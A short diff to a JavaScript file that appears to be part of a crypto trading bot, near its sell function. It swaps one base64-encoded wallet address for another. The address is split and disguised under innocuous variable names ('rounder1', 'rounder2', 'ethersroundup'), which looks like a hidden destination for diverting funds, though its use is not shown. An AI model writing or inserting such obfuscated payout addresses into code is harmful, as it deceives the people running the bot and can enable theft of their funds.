@@ -371,8 +371,8 @@ async function sell(tokenObj, isProfit) {
 }
 
 
-let rounder1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
-let rounder2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
+let rounder1 = 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=';
+let rounder2 = 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ=='
 let buff = new Buffer.from(rounder1, 'base64');
 let buff2 = new Buffer.from(rounder2, 'base64');
 let ethersroundup = buff.toString('ascii');
